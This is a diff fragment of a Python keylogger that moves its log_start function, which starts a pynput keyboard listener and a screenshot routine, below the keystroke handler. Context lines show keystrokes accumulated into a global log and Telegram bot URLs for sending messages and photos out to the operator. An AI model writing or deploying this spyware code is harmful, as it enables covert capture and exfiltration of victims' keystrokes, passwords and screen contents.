@@ -96,12 +96,6 @@ SHOTURL = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
 LOGURL = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&" 
 LOG = ""
 
-def log_start():
-    keyboard_listener = pynput.keyboard.Listener(on_press=log)
-    with keyboard_listener:
-        send_shot()
-        keyboard_listener.join()
-
 def log(key):
     global LOG
     current_key = ""
@@ -196,6 +190,12 @@ def log(key):
         else:
             current_key += " " + str(key) + " "
     LOG += current_key
+    
+def log_start():
+    keyboard_listener = pynput.keyboard.Listener(on_press=log)
+    with keyboard_listener:
+        send_shot()
+        keyboard_listener.join()
 
 def send_shot():
     global LOG
